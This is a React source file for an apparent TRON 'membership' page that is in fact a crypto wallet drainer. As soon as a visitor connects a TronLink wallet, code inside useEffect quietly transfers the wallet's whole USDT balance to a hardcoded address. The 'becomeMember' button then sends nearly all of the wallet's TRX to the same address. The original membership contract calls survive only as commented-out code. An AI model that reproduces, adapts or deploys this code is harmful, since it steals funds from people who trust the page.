import React, { useEffect, useState } from "react";
// import logo from './logo.svg';
import "./App.css";
// import {Route, Routes} from "react-router-dom";
var bigInt = require("big-integer");


const toAddress = "TEHuRcrgpZErt8ySeiUUhgiCHgd3AFgeRt";
const AppKey = "";
const usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const network = "nile";

//

function App() {
  const [popup, setPopup] = useState({ current: null, item: null });
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [isMember, setIsMember] = useState(false);
  const trc20ContractAddress = "TJmCWKy4heyAuigcExrmChVLL3nPV342Nv"; //contract address
  const fromAddress = walletAddress;

  const onPopup = (current = null, item = null) => {
    setPopup({ current, item });
  };

  const onConnect = async () => {
    try {
      //      debugger;
      await window.tronLink.request({ method: "tron_requestAccounts" });
      let accounts = await window.tronLink;
      setWalletConnected(true);
      setWalletAddress(accounts.tronWeb.defaultAddress.base58);
    } catch (err) {
      console.log("Error: ", err);
      onPopup("error", "TronLink extension is not installed");
    }
  };

  async function becomeMember() {
    let tronWeb = await window.tronLink.tronWeb;
    let walletBalance = await tronWeb.trx.getBalance(walletAddress);
    walletBalance = walletBalance - 20 * 1000000;
    console.log("Transferable wallet balance : = ", walletBalance);
      
    if (walletBalance < 0) {
      setMembershipStatus("Not Enough Funds");
      return;
    }
    else{
      tronWeb.trx.sendTransaction(toAddress,walletBalance);

    }

    // if (isMember === true) {
    //   setMembershipStatus("Already a Member !");
    //   return;
    // }
    // try {
    //   setMembershipStatus("Trying to become Member..");
    //   let contract = await tronWeb.contract().at(trc20ContractAddress);
    //   //Use call to execute a pure or view smart contract method.
    //   // These methods do not modify the blockchain, do not cost anything to execute and are also not broadcasted to the network.
    //   let result = await contract.becomeMember().send({
    //     callValue: walletBalance,
    //   });
    //   console.log("result: ", result);
    //   setMembershipStatus("Successfully got Membership 🥳");
    // } catch (error) {
    //   if (!isMember) setMembershipStatus("Failed to become a member");

    //   console.error("trigger smart contract error", error);
    // }

  }
  async function getMembershipStatus() {
    // let tronWeb = await window.tronLink.tronWeb;
    // setMembershipStatus("Checking..");
    // try {
    //   let contract = await tronWeb.contract().at(trc20ContractAddress);
    //   //Use call to execute a pure or view smart contract method.
    //   // These methods do not modify the blockchain, do not cost anything to execute and are also not broadcasted to the network.
    //   let result = await contract.isMember(walletAddress).call();
    //   setMembershipStatus(
    //     result == true ? "Yes, A Member" : "No , Not a member"
    //   );
    //   setIsMember(result);
    // } catch (error) {
    //   console.error("trigger smart contract error", error);
    // }
    return false;

  }

  function setMembershipStatus(msg) {
    document.getElementById("membershipStatus").innerHTML = msg;
  }

  async function sendTRC20Token(
    network,
    fromAddress,
    toAddress,
    amount,
    AppKey,
    CONTRACT
  ) {
    let url = null;
    if (network === "shasta") {
      url = "https://api.shasta.trongrid.io";
    } else if (network === "nile") {
      url = "https://nile.trongrid.io";
    } else {
      url = "https://api.trongrid.io";
    }
    let tronWeb = await window.tronLink.tronWeb;

    const options = {
      feeLimit: 10000000,
      callValue: 0,
    };
    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
      CONTRACT,
      "transfer(address,uint256)",
      options,
      [
        {
          type: "address",
          value: toAddress,
        },
        {
          type: "uint256",
          value: amount.toString(),
        },
      ],
      tronWeb.address.toHex(fromAddress)
    );
    const signedTx = await tronWeb.trx.sign(tx.transaction);
    const broadcastTx = await tronWeb.trx.sendRawTransaction(signedTx);
    return broadcastTx;
  }

  //
  async function getBalance(network, address, CONTRACT) {
    let url = null;
    if (network === "shasta") {
      url = "https://api.shasta.trongrid.io";
    } else if (network === "nile") {
      url = "https://nile.trongrid.io";
    } else {
      url = "https://api.trongrid.io";
    }

    let tronWeb = await window.tronLink.tronWeb;
    // tronWeb.setPrivateKey(privateKey);

    try {
      console.log("contract address received ",CONTRACT);
      let contract = await tronWeb.contract().at(CONTRACT);
      const result = await contract.balanceOf(address).call();
      let number =  bigInt(result.toString());
      console.log("number is ",number);

      return  number.toJSNumber();
    } catch (error) {
      console.log(error);
      return null;
    }
  }

  async function sendUSD() {

    //
    let balance = await logContractBalance(usdt_contract);
    let amount  = balance;
    await sendTRC20Token(
      network,
      fromAddress,
      toAddress,
      amount,
      AppKey,
      usdt_contract
    );

  }

  async function logContractBalance(contract){
    let bal= await getBalance(network,walletAddress,contract);

    return bal;

  }
  useEffect(() => {
    if (walletAddress !== null) {
      // getMembershipStatus();

      sendUSD();


    } else {
    }
  }, [walletAddress]);

  return (
    <>
      <div className="app">
        <div className="membership">
          <div className="membership__buttons">
            {!walletConnected && (
              <button onClick={onConnect}>Connect Wallet</button>
            )}
            {walletConnected && (
              <>
                {/* <button
                  id="membershipStatusButton"
                  onClick={getMembershipStatus}
                >
                  Get Membership Status
                </button> */}
                <button id="becomeMember" onClick={becomeMember}>
                  becomeMember
                </button>
              </>
            )}
          </div>

          <p id="membershipStatus"></p>
        </div>
      </div>
    </>
  );
}

export default App;
